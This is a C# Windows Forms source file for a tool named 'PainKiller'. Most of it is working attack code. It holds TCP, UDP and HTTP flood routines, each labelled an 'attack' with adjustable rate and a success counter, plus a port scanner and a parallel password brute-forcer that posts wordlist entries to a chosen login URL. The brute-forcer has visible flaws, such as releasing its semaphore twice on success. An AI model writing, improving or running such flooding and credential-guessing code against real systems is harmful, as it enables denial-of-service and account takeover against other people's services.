using System.Net.Sockets;
using System;
using System.Threading;
using System.Net.Http;
using System.Threading.Tasks;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using System.Threading;
using static System.Net.WebRequestMethods;
namespace Painkiller
{
    public partial class PainKiller : Form
    {
        public PainKiller()
        {
            InitializeComponent();
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            int a, b, c;
            if (textBox2.Text == null || textBox2.Text == "")
            {
                textBox2.Text = "80";
            }
            if (textBox3.Text == null || textBox3.Text == "")
            {
                textBox3.Text = "1000";
            }
            if (textBox4.Text == null || textBox4.Text == "")
            {
                textBox4.Text = "10";
            }
            if (textBox1.Text == "" || textBox1.Text == null)
            {
                MessageBox.Show("You have to insert IP address");
            }
            else if (!int.TryParse(textBox2.Text, out a))
            {
                MessageBox.Show("port type is not int , you have to insert numbers");
            }
            else if (!int.TryParse(textBox3.Text, out b))
            {
                MessageBox.Show("amount type is not int , you have to insert numbers");
            }
            else if (!int.TryParse(textBox4.Text, out c))
            {
                MessageBox.Show("sleep time type is not int , you have to insert numbers");
            }
            else
            {
                progressBar1.Minimum = 0;
                progressBar1.Maximum = b;

                int successCount = 0;
                int failureCount = 0;
                for (int i = 0; i < b; i++)
                {
                    try
                    {

                        progressBar1.Value = i + 1;
                        using (TcpClient client = new TcpClient())
                        {
                            await client.ConnectAsync(textBox1.Text, a);
                            client.Close();
                            successCount++;
                            label4.Text = ($"Connection successful ({successCount}/{b})");
                        }
                    }
                    catch (SocketException ex) when (ex.SocketErrorCode == SocketError.ConnectionRefused)
                    {
                        failureCount++;
                        label4.Text = ($"Connection refused ({failureCount}/{b})");
                    }
                    catch (Exception ex)
                    {
                        label4.Text = ($"Error: {ex.Message}");
                    }
                    await Task.Delay(c); // Adjust the sleep time to control the attack rate
                }
                label4.Text = $"Attack completed. Success rate: {successCount}/{b} ({(successCount / (double)b) * 100:F2}%)";
            }



        }
        public static string IsPortOpen(string host, int port, int timeout)
        {
            try
            {
                using (var tcpClient = new TcpClient())
                {
                    // TCP ulanishini tekshirish
                    var asyncResult = tcpClient.BeginConnect(host, port, null, null);
                    var success = asyncResult.AsyncWaitHandle.WaitOne(timeout);

                    if (!success)
                    {
                        return "Close";
                    }

                    tcpClient.EndConnect(asyncResult);
                    return "********open";
                }
            }
            catch (Exception)
            {
                return "not respoonse";
            }
        }


        private void progressBar1_Click(object sender, EventArgs e)
        {

        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            int a;
            if (textBox5.Text == "")
            {
                MessageBox.Show("Fill the ip address");
            }
            else if (!int.TryParse(textBox6.Text, out a))
            {
                MessageBox.Show("Insert amount of ports");
            }
            else
            {
                for (int i = 1; i < a; i++)
                {
                    listBox1.Items.Add($"{i} port is {IsPortOpen(textBox5.Text, i, 100)}");
                }
            }
        }

        private void PainKiller_Load(object sender, EventArgs e)
        {

        }

        private void tabPage2_Click(object sender, EventArgs e)
        {

        }

        private async void button3_Click(object sender, EventArgs e)
        {
            int a, b, c;
            if (textBox9.Text == null || textBox9.Text == "")
            {
                textBox9.Text = "80";
            }
            if (textBox8.Text == null || textBox8.Text == "")
            {
                textBox8.Text = "1000";
            }
            if (textBox7.Text == null || textBox7.Text == "")
            {
                textBox7.Text = "10";
            }
            if (textBox10.Text == "" || textBox10.Text == null)
            {
                MessageBox.Show("You have to insert IP address");
            }
            else if (!int.TryParse(textBox9.Text, out a))
            {
                MessageBox.Show("port type is not int , you have to insert numbers");
            }
            else if (!int.TryParse(textBox8.Text, out b))
            {
                MessageBox.Show("amount type is not int , you have to insert numbers");
            }
            else if (!int.TryParse(textBox7.Text, out c))
            {
                MessageBox.Show("sleep time type is not int , you have to insert numbers");
            }
            else
            {
                progressBar2.Minimum = 0;
                progressBar2.Maximum = b;

                int successCount = 0;
                int failureCount = 0;
                for (int i = 0; i < b; i++)
                {
                    try
                    {

                        progressBar2.Value = i + 1;
                        using (UdpClient client2 = new())
                        {
                            byte[] packet = new byte[1024];
                            await client2.SendAsync(packet, packet.Length, textBox10.Text, a);
                            await Task.Delay(c);
                            successCount++;
                            label9.Text = ($"Connection successful ({successCount}/{b})");
                        }
                    }
                    catch (SocketException ex) when (ex.SocketErrorCode == SocketError.ConnectionRefused)
                    {
                        failureCount++;
                        label9.Text = ($"Connection refused ({failureCount}/{b})");
                    }
                    catch (Exception ex)
                    {
                        label9.Text = ($"Error: {ex.Message}");
                    }
                    await Task.Delay(c); // Adjust the sleep time to control the attack rate
                }
                label9.Text = $"Attack completed. Success rate: {successCount}/{b} ({(successCount / (double)b) * 100:F2}%)";
            }
        }
        private void textBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void tabPage2_Click_1(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            Application.Restart();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Application.Restart();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            int a, b, c;
            if (string.IsNullOrWhiteSpace(textBox12.Text))
            {
                textBox12.Text = "1000";
            }
            if (string.IsNullOrWhiteSpace(textBox13.Text))
            {
                textBox13.Text = "10";
            }
            if (string.IsNullOrWhiteSpace(textBox11.Text))
            {
                MessageBox.Show("You have to insert IP address");
            }
            else if (!int.TryParse(textBox12.Text, out b))
            {
                MessageBox.Show("amount type is not int, you have to insert numbers");
            }
            else if (!int.TryParse(textBox13.Text, out c))
            {
                MessageBox.Show("sleep time type is not int, you have to insert numbers");
            }
            else
            {
                progressBar3.Minimum = 0;
                progressBar3.Maximum = b;

                int successCount = 0;
                int failureCount = 0;

                Task.Run(() =>
                {
                    Parallel.For(0, b, i =>
                    {
                        try
                        {
                            using (HttpClient client = new HttpClient())
                            {
                                var response = client.GetAsync(textBox11.Text).Result;
                                if (response.IsSuccessStatusCode)
                                {
                                    Interlocked.Increment(ref successCount);
                                    UpdateLabel($"Connection successful ({successCount}/{b})");
                                }
                                else
                                {
                                    Interlocked.Increment(ref failureCount);
                                    UpdateLabel($"Connection failed ({failureCount}/{b})");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            UpdateLabel($"Error: {ex.Message}");
                        }
                        finally
                        {
                            UpdateProgressBar(i + 1);
                            Task.Delay(c).Wait();
                        }
                    });

                    UpdateLabel($"Attack completed. Success rate: {successCount}/{b} ({(successCount / (double)b) * 100:F2}%)");
                });
            }
        }

        private void UpdateProgressBar(int value)
        {
            if (progressBar3.InvokeRequired)
            {
                progressBar3.Invoke(new Action(() => progressBar3.Value = value));
            }
            else
            {
                progressBar3.Value = value;
            }
        }

        private void UpdateLabel(string text)
        {
            if (label16.InvokeRequired)
            {
                label16.Invoke(new Action(() => label16.Text = text));
            }
            else
            {
                label16.Text = text;
            }
        }


        private void button7_Click(object sender, EventArgs e)
        {
            Application.Restart();
        }

        private void PainKiller_Load_1(object sender, EventArgs e)
        {

        }

        private void label19_Click(object sender, EventArgs e)
        {

        }

        private void tabPage5_Click(object sender, EventArgs e)
        {

        }

        private void textBox16_TextChanged(object sender, EventArgs e)
        {

        }

        private async void button8_Click(object sender, EventArgs e)
        {
            if (textBox15.Text == "")
            {
                MessageBox.Show("Insert URL");
            }
            else if (textBox14.Text == "")
            {
                MessageBox.Show("Insert username");
            }
            else if (textBox16.Text == "")
            {
                MessageBox.Show("Insert wordlist path");
            }
            else if (textBox18.Text == "")
            {
                MessageBox.Show("Insert password variant");
            }
            else if (textBox17.Text == "")
            {
                MessageBox.Show("Insert username variant");
            }
            else
            {
                string targetURL = textBox15.Text; 
                string username =  textBox14.Text;
                string passwordListFile = textBox16.Text;

                string[] passwords = System.IO.File.ReadAllLines(passwordListFile); // Faylning hamma qatorlarini RAMga yuklash
                int maxDegreeOfParallelism = 8; //  patok soni
                SemaphoreSlim semaphore = new SemaphoreSlim(maxDegreeOfParallelism);

                using (HttpClient client = new HttpClient())
                {
                    var tasks = new List<Task>();

                    foreach (string password in passwords)
                    {
                        await semaphore.WaitAsync();

                        var task = Task.Run(async () =>
                        {
                            try
                            {
                                // FormData yaratilishi
                                var formData = new FormUrlEncodedContent(new[]
                                {
                            new KeyValuePair<string, string>(textBox17.Text, username),
                            new KeyValuePair<string, string>(textBox18.Text, password)
                        });

                                var response = await client.PostAsync(targetURL, formData);

                                if (response.IsSuccessStatusCode)
                                {
                                    // UI yangilanishini asosiy patokda amalga oshirish
                                    this.Invoke(new Action(() =>
                                    {
                                        listBox2.Items.Add($"Login successful with password: {password}");
                                    }));
                                    // Patoklarni to'xtatish uchun break
                                    semaphore.Release();
                                    return;
                                }
                                else
                                {
                                    // UI yangilanishini asosiy patokda amalga oshirish
                                    this.Invoke(new Action(() =>
                                    {
                                        listBox2.Items.Add($"Failed with password: {password}");
                                    }));
                                }
                            }
                            catch (Exception ex)
                            {
                                // UI yangilanishini asosiy patokda amalga oshirish
                                this.Invoke(new Action(() =>
                                {
                                    listBox2.Items.Add($"Error: {ex.Message}");
                                }));
                            }
                            finally
                            {
                                semaphore.Release();
                            }
                        });

                        tasks.Add(task);
                    }

                    await Task.WhenAll(tasks); // Barcha patoklar tugashini kutish
                }
            }
        }

        private void listBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
